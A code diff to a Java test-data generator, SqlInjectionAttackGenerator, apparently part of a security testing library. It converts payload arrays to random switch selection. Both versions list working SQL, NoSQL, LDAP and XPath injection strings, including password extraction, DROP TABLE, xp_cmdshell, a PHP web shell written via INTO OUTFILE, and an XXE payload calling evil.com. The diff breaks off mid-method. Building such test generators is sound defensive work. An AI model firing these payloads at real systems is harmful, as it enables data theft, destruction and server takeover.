@@ -163,37 +163,26 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create classic UNION-based SQL injection attacks.
      */
     private String createClassicUnionInjection(String pattern) {
-        String[] unionAttacks = {
-                // Basic UNION attacks
-                "' UNION SELECT 1,2,3--",
-                "' UNION SELECT username,password FROM users--",
-                "' UNION ALL SELECT null,null,null--",
+        int unionType = Generators.integers(1, 14).next();
 
-                // UNION with different column counts
-                "' UNION SELECT 1--",
-                "' UNION SELECT 1,2--",
-                "' UNION SELECT 1,2,3,4,5--",
-
-                // UNION with information gathering
-                "' UNION SELECT database(),user(),version()--",
-                "' UNION SELECT table_name FROM information_schema.tables--",
-                "' UNION SELECT column_name FROM information_schema.columns--",
-
-                // UNION with file operations
-                "' UNION SELECT load_file('/etc/passwd')--",
-                "' UNION SELECT 1 INTO OUTFILE '/tmp/result.txt'--",
-
-                // UNION with hex encoding
-                "' UNION SELECT 0x61646D696E--", // 'admin' in hex
-                
-                // UNION with concatenation
-                "' UNION SELECT CONCAT(username,0x3a,password) FROM users--",
-
-                // UNION with subqueries
-                "' UNION SELECT (SELECT password FROM users WHERE username='admin')--"
+        String attack = switch (unionType) {
+            case 1 -> "' UNION SELECT 1,2,3--";
+            case 2 -> "' UNION SELECT username,password FROM users--";
+            case 3 -> "' UNION ALL SELECT null,null,null--";
+            case 4 -> "' UNION SELECT 1--";
+            case 5 -> "' UNION SELECT 1,2--";
+            case 6 -> "' UNION SELECT 1,2,3,4,5--";
+            case 7 -> "' UNION SELECT database(),user(),version()--";
+            case 8 -> "' UNION SELECT table_name FROM information_schema.tables--";
+            case 9 -> "' UNION SELECT column_name FROM information_schema.columns--";
+            case 10 -> "' UNION SELECT load_file('/etc/passwd')--";
+            case 11 -> "' UNION SELECT 1 INTO OUTFILE '/tmp/result.txt'--";
+            case 12 -> "' UNION SELECT 0x61646D696E--"; // 'admin' in hex
+            case 13 -> "' UNION SELECT CONCAT(username,0x3a,password) FROM users--";
+            case 14 -> "' UNION SELECT (SELECT password FROM users WHERE username='admin')--";
+            default -> "' UNION SELECT 1,2,3--";
         };
 
-        String attack = unionAttacks[Math.abs(pattern.hashCode()) % unionAttacks.length];
         return pattern + "?id=" + attack;
     }
 
@@ -201,39 +190,26 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create boolean-based blind SQL injection attacks.
      */
     private String createBooleanBlindInjection(String pattern) {
-        String[] blindAttacks = {
-                // Basic boolean tests
-                "' AND 1=1--",
-                "' AND 1=2--",
-                "' OR 1=1--",
-                "' OR 1=2--",
+        int blindType = Generators.integers(1, 14).next();
 
-                // Substring extraction
-                "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--",
-                "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
-
-                // Database version detection
-                "' AND @@version LIKE '5%'--",
-                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
-
-                // Table existence detection
-                "' AND (SELECT COUNT(*) FROM users)>0--",
-                "' AND EXISTS(SELECT * FROM admin)--",
-
-                // Character-by-character extraction
-                "' AND (SELECT ASCII(MID((SELECT password FROM users WHERE id=1),1,1)))>96--",
-
-                // Length detection
-                "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--",
-
-                // Conditional responses
-                "' AND IF(1=1,SLEEP(0),SLEEP(5))--",
-
-                // Case when conditions
-                "' AND (CASE WHEN 1=1 THEN 'true' ELSE 'false' END)='true'--"
+        String attack = switch (blindType) {
+            case 1 -> "' AND 1=1--";
+            case 2 -> "' AND 1=2--";
+            case 3 -> "' OR 1=1--";
+            case 4 -> "' OR 1=2--";
+            case 5 -> "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--";
+            case 6 -> "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--";
+            case 7 -> "' AND @@version LIKE '5%'--";
+            case 8 -> "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--";
+            case 9 -> "' AND (SELECT COUNT(*) FROM users)>0--";
+            case 10 -> "' AND EXISTS(SELECT * FROM admin)--";
+            case 11 -> "' AND (SELECT ASCII(MID((SELECT password FROM users WHERE id=1),1,1)))>96--";
+            case 12 -> "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--";
+            case 13 -> "' AND IF(1=1,SLEEP(0),SLEEP(5))--";
+            case 14 -> "' AND (CASE WHEN 1=1 THEN 'true' ELSE 'false' END)='true'--";
+            default -> "' AND 1=1--";
         };
 
-        String attack = blindAttacks[Math.abs(pattern.hashCode()) % blindAttacks.length];
         return pattern + "?search=" + attack;
     }
 
@@ -241,39 +217,26 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create time-based blind SQL injection attacks.
      */
     private String createTimeBlindInjection(String pattern) {
-        String[] timeAttacks = {
-                // MySQL time delays
-                "'; SELECT SLEEP(5)--",
-                "' AND SLEEP(5)--",
-                "' OR SLEEP(5)--",
-                "' AND IF(1=1,SLEEP(5),0)--",
+        int timeType = Generators.integers(1, 14).next();
 
-                // PostgreSQL time delays
-                "'; SELECT pg_sleep(5)--",
-                "' AND (SELECT pg_sleep(5))IS NULL--",
-
-                // MSSQL time delays
-                "'; WAITFOR DELAY '00:00:05'--",
-                "' AND (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)--",
-
-                // Oracle time delays
-                "'; SELECT dbms_lock.sleep(5) FROM dual--",
-                "' AND (SELECT dbms_pipe.receive_message(('a'),5) FROM dual) IS NULL--",
-
-                // SQLite time delays (CPU intensive)
-                "' AND (SELECT COUNT(*) FROM (SELECT * FROM sqlite_master))>100000--",
-
-                // Conditional time delays
-                "' AND IF(ASCII(SUBSTRING(password,1,1))>96,SLEEP(5),0) FROM users WHERE username='admin'--",
-
-                // Nested time delays
-                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND SLEEP(5)--",
-
-                // Heavy computation delays
-                "' AND (SELECT * FROM (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C))--"
+        String attack = switch (timeType) {
+            case 1 -> "'; SELECT SLEEP(5)--";
+            case 2 -> "' AND SLEEP(5)--";
+            case 3 -> "' OR SLEEP(5)--";
+            case 4 -> "' AND IF(1=1,SLEEP(5),0)--";
+            case 5 -> "'; SELECT pg_sleep(5)--";
+            case 6 -> "' AND (SELECT pg_sleep(5))IS NULL--";
+            case 7 -> "'; WAITFOR DELAY '00:00:05'--";
+            case 8 -> "' AND (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)--";
+            case 9 -> "'; SELECT dbms_lock.sleep(5) FROM dual--";
+            case 10 -> "' AND (SELECT dbms_pipe.receive_message(('a'),5) FROM dual) IS NULL--";
+            case 11 -> "' AND (SELECT COUNT(*) FROM (SELECT * FROM sqlite_master))>100000--";
+            case 12 -> "' AND IF(ASCII(SUBSTRING(password,1,1))>96,SLEEP(5),0) FROM users WHERE username='admin'--";
+            case 13 -> "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND SLEEP(5)--";
+            case 14 -> "' AND (SELECT * FROM (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C))--";
+            default -> "'; SELECT SLEEP(5)--";
         };
 
-        String attack = timeAttacks[Math.abs(pattern.hashCode()) % timeAttacks.length];
         return pattern + "?filter=" + attack;
     }
 
@@ -281,39 +244,26 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create error-based SQL injection attacks.
      */
     private String createErrorBasedInjection(String pattern) {
-        String[] errorAttacks = {
-                // MySQL error-based extraction
-                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e))--",
-                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users),0x7e),1)--",
+        int errorType = Generators.integers(1, 14).next();
 
-                // PostgreSQL error-based
-                "' AND CAST((SELECT password FROM users WHERE username='admin') AS int)--",
-                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RANDOM()*2))x FROM information_schema.tables GROUP BY x)a)--",
-
-                // MSSQL error-based
-                "' AND CONVERT(INT,(SELECT password FROM users WHERE username='admin'))--",
-                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND()*2))x FROM sysobjects GROUP BY x)a)--",
-
-                // Oracle error-based
-                "' AND UTLXML.getxml('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://evil.com/\"> %remote;]>') IS NULL--",
-
-                // Division by zero errors
-                "' AND 1/0--",
-                "' AND 1/(SELECT 0)--",
-
-                // Type conversion errors
-                "' AND 'a'=0--",
-                "' AND CONVERT(INT,@@version)--",
-
-                // Subquery errors
-                "' AND (SELECT * FROM (SELECT password FROM users)x(password,password))--",
-
-                // XML errors
-                "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT password FROM users WHERE username='admin')))--"
+        String attack = switch (errorType) {
+            case 1 -> "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--";
+            case 2 -> "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e))--";
+            case 3 -> "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users),0x7e),1)--";
+            case 4 -> "' AND CAST((SELECT password FROM users WHERE username='admin') AS int)--";
+            case 5 -> "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RANDOM()*2))x FROM information_schema.tables GROUP BY x)a)--";
+            case 6 -> "' AND CONVERT(INT,(SELECT password FROM users WHERE username='admin'))--";
+            case 7 -> "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND()*2))x FROM sysobjects GROUP BY x)a)--";
+            case 8 -> "' AND UTLXML.getxml('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://evil.com/\"> %remote;]>') IS NULL--";
+            case 9 -> "' AND 1/0--";
+            case 10 -> "' AND 1/(SELECT 0)--";
+            case 11 -> "' AND 'a'=0--";
+            case 12 -> "' AND CONVERT(INT,@@version)--";
+            case 13 -> "' AND (SELECT * FROM (SELECT password FROM users)x(password,password))--";
+            case 14 -> "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT password FROM users WHERE username='admin')))--";
+            default -> "' AND 1/0--";
         };
 
-        String attack = errorAttacks[Math.abs(pattern.hashCode()) % errorAttacks.length];
         return pattern + "?param=" + attack;
     }
 
@@ -321,41 +271,23 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create second-order SQL injection attacks.
      */
     private String createSecondOrderInjection(String pattern) {
-        String[] secondOrderAttacks = {
-                // Username storage for later exploitation
-                "admin' OR 1=1--",
-                "user'; DROP TABLE users--",
-                "test' UNION SELECT password FROM admin--",
+        int secondOrderType = Generators.integers(1, 11).next();
 
-                // Email-based second order
-                "test@evil.com'; UPDATE users SET password='hacked' WHERE username='admin'--",
-
-                // Comment-based second order
-                "Nice post!'; INSERT INTO admin (username,password) VALUES ('hacker','pass')--",
-
-                // Profile update second order
-                "John Doe'; UPDATE profiles SET role='admin' WHERE user_id=1--",
-
-                // Search history second order
-                "search'; DELETE FROM logs WHERE user_id=1--",
-
-                // File name second order
-                "document.pdf'; SELECT * FROM sensitive_data INTO OUTFILE '/tmp/leaked.txt'--",
-
-                // Session data second order
-                "session'; UPDATE sessions SET user_id=1 WHERE session_id='current'--",
-
-                // Multi-step attack
-                "step1'; CREATE TABLE temp AS SELECT * FROM users--",
-
-                // Delayed execution
-                "trigger'; CREATE TRIGGER evil AFTER INSERT ON logs FOR EACH ROW BEGIN DELETE FROM users; END--",
-
-                // Stored procedure call
-                "data'; CALL admin_function('evil_param')--"
+        String attack = switch (secondOrderType) {
+            case 1 -> "admin' OR 1=1--";
+            case 2 -> "user'; DROP TABLE users--";
+            case 3 -> "test' UNION SELECT password FROM admin--";
+            case 4 -> "test@evil.com'; UPDATE users SET password='hacked' WHERE username='admin'--";
+            case 5 -> "Nice post!'; INSERT INTO admin (username,password) VALUES ('hacker','pass')--";
+            case 6 -> "John Doe'; UPDATE profiles SET role='admin' WHERE user_id=1--";
+            case 7 -> "search'; DELETE FROM logs WHERE user_id=1--";
+            case 8 -> "document.pdf'; SELECT * FROM sensitive_data INTO OUTFILE '/tmp/leaked.txt'--";
+            case 9 -> "session'; UPDATE sessions SET user_id=1 WHERE session_id='current'--";
+            case 10 -> "step1'; CREATE TABLE temp AS SELECT * FROM users--";
+            case 11 -> "trigger'; CREATE TRIGGER evil AFTER INSERT ON logs FOR EACH ROW BEGIN DELETE FROM users; END--";
+            default -> "admin' OR 1=1--";
         };
 
-        String attack = secondOrderAttacks[Math.abs(pattern.hashCode()) % secondOrderAttacks.length];
         return pattern + "?username=" + attack;
     }
 
@@ -363,42 +295,27 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create NoSQL injection attacks.
      */
     private String createNoSqlInjection(String pattern) {
-        String[] noSqlAttacks = {
-                // MongoDB injection
-                "[$ne]=null",
-                "[$gt]=",
-                "[$regex]=.*",
-                "[$where]=function(){return true}",
+        int noSqlType = Generators.integers(1, 15).next();
 
-                // CouchDB injection
-                "?key=\"\\u0000\"",
-                "?startkey=\"\"&endkey=\"\\ufff0\"",
-
-                // MongoDB operator injection
-                "admin\",\"$ne\":\"xyz\"}//",
-                "admin\",\"password\":{\"$ne\":\"xyz\"}}//",
-
-                // JSON NoSQL injection
-                "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
-                "{\"$or\":[{\"username\":\"admin\"},{\"role\":\"admin\"}]}",
-
-                // CouchDB view injection
-                "function(doc){if(doc.type=='user')return true;}",
-
-                // MongoDB aggregation injection
-                "[{\"$match\":{\"$where\":\"function(){return true}\"}}]",
-
-                // Redis injection (via SQL context)
-                "'; SET evil 'hacked'; GET evil--",
-
-                // ElasticSearch injection
-                "{\"query\":{\"match_all\":{}}}",
-
-                // Cassandra CQL injection
-                "'; DROP TABLE users;--"
+        String attack = switch (noSqlType) {
+            case 1 -> "[$ne]=null";
+            case 2 -> "[$gt]=";
+            case 3 -> "[$regex]=.*";
+            case 4 -> "[$where]=function(){return true}";
+            case 5 -> "?key=\"\\u0000\"";
+            case 6 -> "?startkey=\"\"&endkey=\"\\ufff0\"";
+            case 7 -> "admin\",\"$ne\":\"xyz\"}//";
+            case 8 -> "admin\",\"password\":{\"$ne\":\"xyz\"}}//";
+            case 9 -> "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}";
+            case 10 -> "{\"$or\":[{\"username\":\"admin\"},{\"role\":\"admin\"}]}";
+            case 11 -> "function(doc){if(doc.type=='user')return true;}";
+            case 12 -> "[{\"$match\":{\"$where\":\"function(){return true}\"}}]";
+            case 13 -> "'; SET evil 'hacked'; GET evil--";
+            case 14 -> "{\"query\":{\"match_all\":{}}}";
+            case 15 -> "'; DROP TABLE users;--";
+            default -> "[$ne]=null";
         };
 
-        String attack = noSqlAttacks[Math.abs(pattern.hashCode()) % noSqlAttacks.length];
         return pattern + "?query=" + attack;
     }
 
@@ -406,38 +323,25 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create LDAP injection attacks via SQL context.
      */
     private String createLdapInjection(String pattern) {
-        String[] ldapAttacks = {
-                // Basic LDAP injection
-                "admin)(&)",
-                "admin)(|(uid=*))",
-                "admin)(|(objectClass=*))",
+        int ldapType = Generators.integers(1, 13).next();
 
-                // LDAP wildcard injection
-                "*)(uid=*))(|(uid=*",
-                "admin*",
-                "*))%00",
-
-                // LDAP bind attacks
-                "cn=admin,dc=example,dc=com)(&(uid=*))",
-
-                // LDAP search filter injection
-                "*))|(&(objectClass=user)(cn=*",
-
-                // LDAP attribute injection
-                "admin)(mail=*))%00",
-
-                // Combined SQL-LDAP attack
-                "'; SELECT * FROM ldap_users WHERE dn='cn=admin)(|(uid=*'--",
-
-                // LDAP enumeration
-                "a*)(|(cn=a*",
-
-                // LDAP authentication bypass
-                "admin)(%26)",
-                "*))(|(userPassword=*"
+        String attack = switch (ldapType) {
+            case 1 -> "admin)(&)";
+            case 2 -> "admin)(|(uid=*))";
+            case 3 -> "admin)(|(objectClass=*))";
+            case 4 -> "*)(uid=*))(|(uid=*";
+            case 5 -> "admin*";
+            case 6 -> "*))%00";
+            case 7 -> "cn=admin,dc=example,dc=com)(&(uid=*))";
+            case 8 -> "*))|(&(objectClass=user)(cn=*";
+            case 9 -> "admin)(mail=*))%00";
+            case 10 -> "'; SELECT * FROM ldap_users WHERE dn='cn=admin)(|(uid=*'--";
+            case 11 -> "a*)(|(cn=a*";
+            case 12 -> "admin)(%26)";
+            case 13 -> "*))(|(userPassword=*";
+            default -> "admin)(&)";
         };
 
-        String attack = ldapAttacks[Math.abs(pattern.hashCode()) % ldapAttacks.length];
         return pattern + "?ldap_query=" + attack;
     }
 
@@ -445,41 +349,27 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create SQL comment injection attacks.
      */
     private String createCommentInjection(String pattern) {
-        String[] commentAttacks = {
-                // Comment out WHERE clause
-                "admin'--",
-                "admin'#",
-                "admin'/*",
+        int commentType = Generators.integers(1, 15).next();
 
-                // Multi-line comment injection
-                "admin'/**/OR/**/1=1/**/--",
-                "admin'/*comment*/UNION/*comment*/SELECT/*comment*/1--",
-
-                // Nested comment injection
-                "admin'/*/*/OR/*/*/1=1/*/*/--",
-
-                // Comment with payload
-                "admin';/*payload*/SELECT/*payload*/password/*payload*/FROM/*payload*/users/*payload*/--",
-
-                // URL encoded comments
-                "admin'%2D%2D",
-                "admin'%23",
-                "admin'%2F%2A",
-
-                // Platform-specific comments
-                "admin'--+",  // MySQL
-                "admin';--",  // MSSQL
-                "admin'#",    // MySQL/PostgreSQL
-                
-                // Comment evasion
-                "admin'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL/**/--",
-
-                // Comment with line feed
-                "admin'--\n",
-                "admin'#\n"
+        String attack = switch (commentType) {
+            case 1 -> "admin'--";
+            case 2 -> "admin'#";
+            case 3 -> "admin'/*";
+            case 4 -> "admin'/**/OR/**/1=1/**/--";
+            case 5 -> "admin'/*comment*/UNION/*comment*/SELECT/*comment*/1--";
+            case 6 -> "admin'/*/*/OR/*/*/1=1/*/*/--";
+            case 7 -> "admin';/*payload*/SELECT/*payload*/password/*payload*/FROM/*payload*/users/*payload*/--";
+            case 8 -> "admin'%2D%2D";
+            case 9 -> "admin'%23";
+            case 10 -> "admin'%2F%2A";
+            case 11 -> "admin'--+";  // MySQL
+            case 12 -> "admin';--";  // MSSQL
+            case 13 -> "admin'#";    // MySQL/PostgreSQL
+            case 14 -> "admin'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL/**/--";
+            case 15 -> "admin'--\n";
+            default -> "admin'--";
         };
 
-        String attack = commentAttacks[Math.abs(pattern.hashCode()) % commentAttacks.length];
         return pattern + "?user=" + attack;
     }
 
@@ -487,42 +377,25 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create stacked queries attacks.
      */
     private String createStackedQueries(String pattern) {
-        String[] stackedAttacks = {
-                // Basic stacked queries
-                "'; SELECT 1--",
-                "'; DROP TABLE users--",
-                "'; INSERT INTO users VALUES ('hacker','pass')--",
+        int stackedType = Generators.integers(1, 13).next();
 
-                // Multiple statements
-                "'; UPDATE users SET password='hacked' WHERE username='admin'; SELECT 1--",
-
-                // Administrative commands
-                "'; CREATE USER hacker IDENTIFIED BY 'pass'--",
-                "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--",
-
-                // Data exfiltration
-                "'; SELECT * FROM users INTO OUTFILE '/tmp/users.txt'--",
-
-                // Database manipulation
-                "'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(100)--",
-
-                // System commands (MySQL)
-                "'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'--",
-
-                // Trigger creation
-                "'; CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW INSERT INTO admin VALUES (NEW.username, NEW.password)--",
-
-                // Stored procedure creation
-                "'; CREATE PROCEDURE GetData() BEGIN SELECT * FROM sensitive_table; END--",
-
-                // Transaction manipulation
-                "'; BEGIN; UPDATE users SET role='admin' WHERE username='hacker'; COMMIT--",
-
-                // Conditional execution
-                "'; IF @@version LIKE '%mysql%' SELECT 'MySQL' ELSE SELECT 'Other'--"
+        String attack = switch (stackedType) {
+            case 1 -> "'; SELECT 1--";
+            case 2 -> "'; DROP TABLE users--";
+            case 3 -> "'; INSERT INTO users VALUES ('hacker','pass')--";
+            case 4 -> "'; UPDATE users SET password='hacked' WHERE username='admin'; SELECT 1--";
+            case 5 -> "'; CREATE USER hacker IDENTIFIED BY 'pass'--";
+            case 6 -> "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--";
+            case 7 -> "'; SELECT * FROM users INTO OUTFILE '/tmp/users.txt'--";
+            case 8 -> "'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(100)--";
+            case 9 -> "'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'--";
+            case 10 -> "'; CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW INSERT INTO admin VALUES (NEW.username, NEW.password)--";
+            case 11 -> "'; CREATE PROCEDURE GetData() BEGIN SELECT * FROM sensitive_table; END--";
+            case 12 -> "'; BEGIN; UPDATE users SET role='admin' WHERE username='hacker'; COMMIT--";
+            case 13 -> "'; IF @@version LIKE '%mysql%' SELECT 'MySQL' ELSE SELECT 'Other'--";
+            default -> "'; SELECT 1--";
         };
 
-        String attack = stackedAttacks[Math.abs(pattern.hashCode()) % stackedAttacks.length];
         return pattern + "?action=" + attack;
     }
 
@@ -530,44 +403,29 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create database-specific attacks.
      */
     private String createDatabaseSpecificAttacks(String pattern) {
-        String[] dbSpecificAttacks = {
-                // MySQL specific
-                "' AND @@version--",
-                "' UNION SELECT load_file('/etc/passwd')--",
-                "' INTO OUTFILE '/var/www/backdoor.php'--",
+        int dbType = Generators.integers(1, 17).next();
 
-                // PostgreSQL specific
-                "' AND version()='PostgreSQL'--",
-                "'; COPY users FROM '/tmp/evil.csv'--",
-                "' UNION SELECT pg_read_file('/etc/passwd')--",
-
-                // MSSQL specific
-                "' AND @@version LIKE '%Microsoft%'--",
-                "'; EXEC master..xp_cmdshell 'dir'--",
-                "' UNION SELECT * FROM OPENROWSET('SQLOLEDB','server';'uid';'pwd','SELECT * FROM users')--",
-
-                // Oracle specific
-                "' AND banner LIKE '%Oracle%' FROM v$version--",
-                "' UNION SELECT utl_file.get_line('DIRECTORY','filename') FROM dual--",
-
-                // SQLite specific
-                "' AND sqlite_version()>='3'--",
-                "' UNION SELECT tbl_name FROM sqlite_master--",
-
-                // Access specific
-                "' AND 1=IIF(1=1,1,0)--",
-                "' UNION SELECT * FROM MSysObjects--",
-
-                // DB2 specific
-                "' AND USER='DB2ADMIN'--",
-                "' UNION SELECT * FROM sysibm.systables--",
-
-                // Sybase specific
-                "' AND @@version LIKE '%Sybase%'--",
-                "' UNION SELECT name FROM sysobjects--"
+        String attack = switch (dbType) {
+            case 1 -> "' AND @@version--";
+            case 2 -> "' UNION SELECT load_file('/etc/passwd')--";
+            case 3 -> "' INTO OUTFILE '/var/www/backdoor.php'--";
+            case 4 -> "' AND version()='PostgreSQL'--";
+            case 5 -> "'; COPY users FROM '/tmp/evil.csv'--";
+            case 6 -> "' UNION SELECT pg_read_file('/etc/passwd')--";
+            case 7 -> "' AND @@version LIKE '%Microsoft%'--";
+            case 8 -> "'; EXEC master..xp_cmdshell 'dir'--";
+            case 9 -> "' UNION SELECT * FROM OPENROWSET('SQLOLEDB','server';'uid';'pwd','SELECT * FROM users')--";
+            case 10 -> "' AND banner LIKE '%Oracle%' FROM v$version--";
+            case 11 -> "' UNION SELECT utl_file.get_line('DIRECTORY','filename') FROM dual--";
+            case 12 -> "' AND sqlite_version()>='3'--";
+            case 13 -> "' UNION SELECT tbl_name FROM sqlite_master--";
+            case 14 -> "' AND 1=IIF(1=1,1,0)--";
+            case 15 -> "' UNION SELECT * FROM MSysObjects--";
+            case 16 -> "' AND USER='DB2ADMIN'--";
+            case 17 -> "' UNION SELECT * FROM sysibm.systables--";
+            default -> "' AND @@version--";
         };
 
-        String attack = dbSpecificAttacks[Math.abs(pattern.hashCode()) % dbSpecificAttacks.length];
         return pattern + "?db_test=" + attack;
     }
 
@@ -575,38 +433,26 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create function-based SQL injection attacks.
      */
     private String createFunctionInjection(String pattern) {
-        String[] functionAttacks = {
-                // String functions
-                "' AND ASCII(SUBSTRING(password,1,1))>64 FROM users WHERE username='admin'--",
-                "' AND LENGTH((SELECT password FROM users WHERE username='admin'))>5--",
-                "' AND LOCATE('admin',(SELECT username FROM users))>0--",
+        int functionType = Generators.integers(1, 14).next();
 
-                // Mathematical functions
-                "' AND FLOOR(RAND(0)*2)=1--",
-                "' AND CEILING((SELECT COUNT(*) FROM users)/2)>1--",
-
-                // Date functions
-                "' AND YEAR(NOW())=2023--",
-                "' AND DATEDIFF(NOW(),(SELECT created_date FROM users WHERE username='admin'))>365--",
-
-                // Conditional functions
-                "' AND IF((SELECT COUNT(*) FROM users)>0,'true','false')='true'--",
-                "' AND CASE WHEN 1=1 THEN 'true' ELSE 'false' END='true'--",
-
-                // Aggregate functions
-                "' AND COUNT(*)>0 FROM users--",
-                "' AND MAX(user_id)>100 FROM users--",
-
-                // System functions
-                "' AND USER()='root'--",
-                "' AND DATABASE()='production'--",
-
-                // Conversion functions
-                "' AND CAST((SELECT password FROM users WHERE username='admin') AS CHAR)='secret'--",
-                "' AND CONVERT((SELECT COUNT(*) FROM users),CHAR)='100'--"
+        String attack = switch (functionType) {
+            case 1 -> "' AND ASCII(SUBSTRING(password,1,1))>64 FROM users WHERE username='admin'--";
+            case 2 -> "' AND LENGTH((SELECT password FROM users WHERE username='admin'))>5--";
+            case 3 -> "' AND LOCATE('admin',(SELECT username FROM users))>0--";
+            case 4 -> "' AND FLOOR(RAND(0)*2)=1--";
+            case 5 -> "' AND CEILING((SELECT COUNT(*) FROM users)/2)>1--";
+            case 6 -> "' AND YEAR(NOW())=2023--";
+            case 7 -> "' AND DATEDIFF(NOW(),(SELECT created_date FROM users WHERE username='admin'))>365--";
+            case 8 -> "' AND IF((SELECT COUNT(*) FROM users)>0,'true','false')='true'--";
+            case 9 -> "' AND CASE WHEN 1=1 THEN 'true' ELSE 'false' END='true'--";
+            case 10 -> "' AND COUNT(*)>0 FROM users--";
+            case 11 -> "' AND MAX(user_id)>100 FROM users--";
+            case 12 -> "' AND USER()='root'--";
+            case 13 -> "' AND DATABASE()='production'--";
+            case 14 -> "' AND CAST((SELECT password FROM users WHERE username='admin') AS CHAR)='secret'--";
+            default -> "' AND ASCII(SUBSTRING(password,1,1))>64 FROM users WHERE username='admin'--";
         };
 
-        String attack = functionAttacks[Math.abs(pattern.hashCode()) % functionAttacks.length];
         return pattern + "?func_test=" + attack;
     }
 
@@ -614,29 +460,20 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create XML/XPath injection in SQL context.
      */
     private String createXmlXpathInjection(String pattern) {
-        String[] xmlAttacks = {
-                // XPath injection
-                "' OR 1=1 or ''='",
-                "'] | //user/* | //password/* | //*['",
-                "admin' and count(//user[position()=1])=1 and '1'='1",
+        int xmlType = Generators.integers(1, 8).next();
 
-                // XML entity injection
-                "'; SELECT EXTRACTVALUE('<xml><!ENTITY xxe SYSTEM \"file:///etc/passwd\">xxe;</xml>','//xxe')--",
-
-                // XPath authentication bypass
-                "admin'] | //user[password='secret' or '1'='1",
-
-                // XPath blind injection
-                "'] | //user[position()=1 and substring(password,1,1)='a'] | //*['",
-
-                // XML CDATA injection
-                "'; SELECT '<![CDATA[' + (SELECT password FROM users WHERE username='admin') + ']]>'--",
-
-                // XPath error-based
-                "'] | //user[contains(password,'error')] | //*['"
+        String attack = switch (xmlType) {
+            case 1 -> "' OR 1=1 or ''='";
+            case 2 -> "'] | //user/* | //password/* | //*['";
+            case 3 -> "admin' and count(//user[position()=1])=1 and '1'='1";
+            case 4 -> "'; SELECT EXTRACTVALUE('<xml><!ENTITY xxe SYSTEM \"file:///etc/passwd\">xxe;</xml>','//xxe')--";
+            case 5 -> "admin'] | //user[password='secret' or '1'='1";
+            case 6 -> "'] | //user[position()=1 and substring(password,1,1)='a'] | //*['";
+            case 7 -> "'; SELECT '<![CDATA[' + (SELECT password FROM users WHERE username='admin') + ']]>'--";
+            case 8 -> "'] | //user[contains(password,'error')] | //*['";
+            default -> "' OR 1=1 or ''='";
         };
 
-        String attack = xmlAttacks[Math.abs(pattern.hashCode()) % xmlAttacks.length];
         return pattern + "?xml_query=" + attack;
     }
 
@@ -644,24 +481,17 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create SQL truncation attacks.
      */
     private String createTruncationAttacks(String pattern) {
